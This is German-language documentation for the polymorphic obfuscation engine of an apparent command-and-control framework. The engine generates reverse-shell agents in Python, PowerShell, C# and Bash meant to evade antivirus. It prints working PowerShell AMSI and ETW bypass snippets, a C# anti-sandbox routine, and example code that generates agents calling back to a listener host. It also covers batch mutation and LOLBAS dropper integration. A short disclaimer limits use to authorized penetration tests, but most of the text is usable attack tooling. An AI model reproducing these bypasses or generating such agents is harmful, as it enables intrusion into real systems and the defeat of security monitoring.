# Polymorphic Obfuscation - Dokumentation

## Übersicht

Das **Polymorphic Obfuscation System** ist eine fortschrittliche Engine zur Generierung von einzigartigen, nicht erkennbaren Payloads und Agenten. Jede Generierung produziert einen völlig anderen Code, der dennoch die gleiche Funktionalität besitzt.

## Features

### 🔄 Polymorphische Techniken

1. **Variable & Funktionsnamen Randomisierung**
   - Einzigartige Namen bei jeder Generierung
   - Mehrere Benennungsstrategien (lesbar, random, mixed-case, underscore)
   - Kollisionsvermeidung

2. **String-Verschlüsselung**
   - Base64 Encoding
   - Hex Encoding
   - ROT13
   - XOR
   - Reverse Base64
   - Custom Alphabet
   - Chunk Encoding

3. **Code-Struktur Transformation**
   - Dead Code Injection
   - Kontrollfluss-Obfuskation
   - Code Reordering
   - Instruktionssubstitution

4. **Mehrschichtige Verschlüsselung**
   - XOR (Standard)
   - Multi-Pass XOR
   - Rotation-based
   - Substitution Cipher
   - Position-based XOR

### 🎯 Unterstützte Sprachen

#### Python
- Polymorphische Variable-/Funktionsnamen
- XOR/Multi-XOR/Rotate/Substitute Verschlüsselung
- Dead Code Functions
- Anti-Debugging Checks
- Zufällige Import-Reihenfolge

#### PowerShell
- Polymorphischer AMSI Bypass (3 Varianten)
- Variable Obfuskation
- String-Verschlüsselung
- Command Obfuscation
- Case Randomization

#### C#
- Anti-Debugging Techniken
- Anti-Sandboxing
- DLL Import Checks
- Timing-basierte Erkennung
- String Encryption
- Polymorphe Struktur

#### Bash
- Base64/Hex/Octal Encoding
- Variable Randomization
- Command Obfuscation
- Process Hiding

### 📊 Obfuskation Levels

#### Low (Niedrig)
- Basis-Variablennamen Randomisierung
- Einfache String-Verschlüsselung
- Minimale Dead Code Injection

#### Medium (Mittel)
- Erweiterte Variablennamen
- Multi-Layer String Encoding
- Moderate Dead Code Injection
- Kontrollfluss-Änderungen

#### High (Hoch) - **Standard**
- Vollständige Polymorphie
- Mehrschichtige Verschlüsselung
- Umfangreiche Dead Code Injection
- Fortgeschrittene Anti-Analysis

#### Extreme (Extrem)
- Maximale Obfuskation
- Alle verfügbaren Techniken
- Extensive Dead Code
- Junk Comments
- Maximale Code-Komplexität

## Verwendung

### In der GUI

1. **Payload Generator öffnen**
   - Elite Reverse Shell Generator Tab

2. **Encoder auswählen**
   - `Polymorphic Python` - Für Python Agents
   - `Polymorphic PowerShell` - Für PowerShell Agents
   - `Polymorphic C#` - Für C# Agents

3. **Generieren**
   - LHOST und LPORT eingeben
   - Payload auswählen
   - "Generate Payload" klicken

### Programmatische Verwendung

#### Einfache Verwendung

```python
from polymorphic_obfuscator import PolymorphicObfuscator

# Obfuscator erstellen
obfuscator = PolymorphicObfuscator(obfuscation_level='high')

# Python Agent generieren
py_agent = obfuscator.obfuscate_python("", "192.168.1.100", 4444)
print(py_agent['code'])
print(f"Techniques: {py_agent['techniques']}")

# PowerShell Agent generieren
ps_agent = obfuscator.obfuscate_powershell("192.168.1.100", 4444)
print(ps_agent['code'])

# C# Agent generieren
cs_agent = obfuscator.obfuscate_csharp("192.168.1.100", 4444)
print(cs_agent['code'])
print(f"Compile: {cs_agent['compile_command']}")

# Bash Agent generieren
bash_agent = obfuscator.obfuscate_bash("192.168.1.100", 4444)
print(bash_agent['code'])
```

#### Mit AV Evasion Engine

```python
from av_evasion_engine import AVEvasionEngine

engine = AVEvasionEngine()

# Polymorphischen Agent generieren
agent = engine.generate_polymorphic_agent(
    lhost="192.168.1.100",
    lport=4444,
    agent_type='python',
    obfuscation_level='extreme'
)

print(agent['code'])
print(f"Techniques: {agent['techniques']}")
```

#### Mit Advanced Agent Generator

```python
from advanced_agent_generator import generate_undetectable_agent

# Mit Polymorphie
agent = generate_undetectable_agent(
    lhost="192.168.1.100",
    lport=4444,
    agent_type='python',
    use_polymorphic=True,
    obfuscation_level='high'
)

print(agent['code'])

# Ohne Polymorphie (Legacy)
agent_legacy = generate_undetectable_agent(
    lhost="192.168.1.100",
    lport=4444,
    agent_type='python',
    use_polymorphic=False
)
```

### Agent Mutation

Existierenden Code mutieren um neue Varianten zu erstellen:

```python
from polymorphic_obfuscator import AgentMutator

mutator = AgentMutator()

# Agent mutieren
original_code = """
import socket
s = socket.socket()
s.connect(("192.168.1.100", 4444))
"""

mutated = mutator.mutate_agent(
    agent_code=original_code,
    language='python',
    mutation_rate=0.5  # 0.0 bis 1.0
)

print(mutated)
```

## Technische Details

### Verschlüsselungsmethoden

#### XOR Encryption
```python
def xor_encrypt(data, key):
    result = bytearray()
    for i in range(len(data)):
        result.append(data[i] ^ key[i % len(key)])
    return bytes(result)
```

#### Multi-Pass XOR
- 2-4 Verschlüsselungsdurchläufe
- Erhöht Komplexität
- Schwerer zu reverse-engineeren

#### Rotation Cipher
- ROT-N mit zufälligem N (1-255)
- Byte-level Rotation
- Schnell und effektiv

#### Position-based Substitution
- Position im Stream beeinflusst Verschlüsselung
- Jedes Byte hat unique XOR-Wert
- Verhindert Pattern-Analyse

### Dead Code Generation

Generiert sinnlose aber valide Funktionen:

```python
def hirojewm(p, q, r):
    """Process data stream"""
    return p + 42

def zekofnim(p, q):
    """Handle network communication"""
    return p * 7

def xalofemi(p):
    """Execute system operation"""
    return str(p)[::-1]
```

### AMSI Bypass Varianten

#### Variant 1: Reflection
```powershell
$amsiUtils = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$amsiField = $amsiUtils.GetField('amsiInitFailed','NonPublic,Static')
$amsiField.SetValue($null,$true)
```

#### Variant 2: Memory Patch
```powershell
$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext','NonPublic,Static').SetValue($null, $mem)
```

#### Variant 3: ETW Bypass
```powershell
[Diagnostics.Eventing.EventProvider].GetField('m_enabled','NonPublic,Instance').SetValue([Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null),0)
```

### Anti-Debugging (C#)

```csharp
static bool AntiSandbox()
{
    // Debugger check
    if (Debugger.IsAttached)
        return true;

    // Sandbox DLL checks
    if (GetModuleHandle("SbieDll.dll") != IntPtr.Zero)
        return true;
    if (GetModuleHandle("snxhk.dll") != IntPtr.Zero)
        return true;

    // Timing check
    DateTime start = DateTime.Now;
    Thread.Sleep(1000);
    if ((DateTime.Now - start).TotalMilliseconds < 900)
        return true;

    return false;
}
```

## Best Practices

### 1. Obfuscation Level Wahl

- **Low**: Schnelle Generierung, Tests
- **Medium**: Produktion mit Performance-Anforderungen
- **High**: Standard für Red Team Operationen ✅
- **Extreme**: Maximale Sicherheit, langsamere Generierung

### 2. Sprachen-Wahl nach Ziel

- **Python**: Linux/Cross-Platform
- **PowerShell**: Windows mit PowerShell
- **C#**: Windows, compilierte Executables
- **Bash**: Linux/Unix Systeme

### 3. Testen

```bash
# Test Polymorphic Engine
python3 polymorphic_obfuscator.py

# Test Integration
python3 -c "
from av_evasion_engine import AVEvasionEngine
e = AVEvasionEngine()
a = e.generate_polymorphic_agent('127.0.0.1', 4444, 'python', 'high')
print('✅ Generated:', len(a['code']), 'bytes')
"
```

### 4. Jede Generierung ist Einzigartig

```python
# Generierung 1
agent1 = obfuscator.obfuscate_python("", "192.168.1.100", 4444)

# Generierung 2 - komplett anderer Code!
agent2 = obfuscator.obfuscate_python("", "192.168.1.100", 4444)

assert agent1['code'] != agent2['code']  # True!
```

## Sicherheitshinweise

⚠️ **Wichtig:**
- Nur für autorisierte Penetration Tests verwenden
- Respektiere lokale Gesetze und Vorschriften
- Hole immer Erlaubnis ein bevor du Systeme testest
- Verwende nur in kontrollierten Umgebungen

## Performance

### Generierungszeiten (Durchschnitt)

| Sprache    | Low   | Medium | High  | Extreme |
|------------|-------|--------|-------|---------|
| Python     | 0.05s | 0.1s   | 0.2s  | 0.5s    |
| PowerShell | 0.03s | 0.08s  | 0.15s | 0.4s    |
| C#         | 0.06s | 0.12s  | 0.25s | 0.6s    |
| Bash       | 0.02s | 0.05s  | 0.1s  | 0.3s    |

### Code-Größen (Durchschnitt)

| Sprache    | Low    | Medium | High  | Extreme |
|------------|--------|--------|-------|---------|
| Python     | 1.5 KB | 2.5 KB | 3.5 KB| 6 KB    |
| PowerShell | 1 KB   | 1.8 KB | 2.5 KB| 4 KB    |
| C#         | 3 KB   | 4 KB   | 5 KB  | 8 KB    |
| Bash       | 0.5 KB | 0.8 KB | 1.2 KB| 2 KB    |

## Troubleshooting

### Problem: Import Error

```bash
# Lösung: Stelle sicher dass polymorphic_obfuscator.py im gleichen Verzeichnis ist
ls -la polymorphic_obfuscator.py
```

### Problem: KeyError in C# Generation

```python
# Lösung: Update auf neueste Version
# Fixed in commit: Added data_var and result_var to C# var_names
```

### Problem: Encoding Fehler

```python
# Lösung: Verwende 'errors=replace' parameter
data.encode('utf-8', errors='replace')
```

## Erweiterte Beispiele

### Custom Obfuscation Level

```python
obfuscator = PolymorphicObfuscator(obfuscation_level='extreme')
agent = obfuscator.obfuscate_python("", "192.168.1.100", 4444)

# Zeige verwendete Techniken
for technique in agent['techniques']:
    print(f"✅ {technique}")
```

### Batch Generation

```python
from polymorphic_obfuscator import PolymorphicObfuscator

obfuscator = PolymorphicObfuscator('high')

# Generiere 10 verschiedene Agents
agents = []
for i in range(10):
    agent = obfuscator.obfuscate_python("", "192.168.1.100", 4444)
    filename = f"agent_{i+1}.py"
    
    with open(filename, 'w') as f:
        f.write(agent['code'])
    
    agents.append(filename)
    print(f"✅ Generated: {filename}")

print(f"\n🎯 Generated {len(agents)} unique agents")
```

### Mit Mutation

```python
from polymorphic_obfuscator import PolymorphicObfuscator, AgentMutator

# Erste Generierung
obfuscator = PolymorphicObfuscator('high')
original = obfuscator.obfuscate_python("", "192.168.1.100", 4444)

# Mutationen erstellen
mutator = AgentMutator()
for i in range(5):
    mutated = mutator.mutate_agent(
        original['code'],
        'python',
        mutation_rate=0.3 + (i * 0.1)  # Steigende Mutation
    )
    
    with open(f"mutant_{i+1}.py", 'w') as f:
        f.write(mutated)
    
    print(f"✅ Mutant {i+1} created with {0.3 + (i * 0.1):.1f} mutation rate")
```

## Integration mit anderen Modulen

### Mit LOLBAS Techniques

```python
from av_evasion_engine import AVEvasionEngine

engine = AVEvasionEngine()

# LOLBAS Payload mit polymorphem Agent kombinieren
lolbas_payload = engine.generate_lolbas_payload("192.168.1.100", 8080)
poly_agent = engine.generate_polymorphic_agent("192.168.1.100", 4444, 'python')

print("📡 LOLBAS Dropper:")
print(lolbas_payload)
print("\n🛡️ Polymorphic Agent:")
print(poly_agent['code'][:500] + "...")
```

### Mit Payload Coordinator

```python
from payload_coordinator import PayloadCoordinator
from av_evasion_engine import AVEvasionEngine

coordinator = PayloadCoordinator()
engine = AVEvasionEngine()

# Target OS erkennen
target_os, confidence = coordinator.detect_target_os("192.168.1.100")
print(f"Target OS: {target_os} (Confidence: {confidence})")

# Passenden polymorphen Agent generieren
agent_type = 'python' if 'Linux' in target_os else 'powershell'
agent = engine.generate_polymorphic_agent(
    "192.168.1.100", 
    4444, 
    agent_type,
    'high'
)

print(f"✅ Generated {agent_type} agent for {target_os}")
```

## FAQ

**Q: Wie oft kann ich die gleichen Parameter verwenden?**
A: Unbegrenzt! Jede Generierung ist einzigartig, selbst mit identischen Parametern.

**Q: Wird der Agent von Antivirenprogrammen erkannt?**
A: Bei 'high' oder 'extreme' Level ist die Erkennungsrate sehr niedrig. Teste immer in einer sicheren Umgebung.

**Q: Kann ich eigene Verschlüsselungsmethoden hinzufügen?**
A: Ja! Erweitere die `_generate_*_functions` Methoden in der PolymorphicObfuscator Klasse.

**Q: Funktioniert das mit allen Python/PowerShell/C# Versionen?**
A: 
- Python: 3.6+
- PowerShell: 5.0+
- C#: .NET Framework 4.5+ / .NET Core 2.0+

**Q: Wie reverse-engineer ich einen polymorphen Agent?**
A: Das ist absichtlich schwierig! Für Debugging verwende 'low' Level oder deaktiviere Polymorphie.

## Changelog

### Version 1.0 (2026-02-18)
- ✅ Initiales Release
- ✅ Python/PowerShell/C#/Bash Support
- ✅ 4 Obfuscation Levels
- ✅ 7 String Encoding Methoden
- ✅ 4 Verschlüsselungsalgorithmen
- ✅ 3 AMSI Bypass Varianten
- ✅ Anti-Debugging für C#
- ✅ Agent Mutation Engine
- ✅ GUI Integration
- ✅ Vollständige Dokumentation

## Kontakt & Support

Bei Fragen oder Problemen:
- Siehe README.md
- Siehe PROJECT_SUMMARY.md
- Siehe TESTING.md

---

**🛡️ c2py - Professional Command & Control Framework mit Polymorphic Obfuscation**

*Entwickelt für professionelle Red Team Operationen und Penetration Testing*
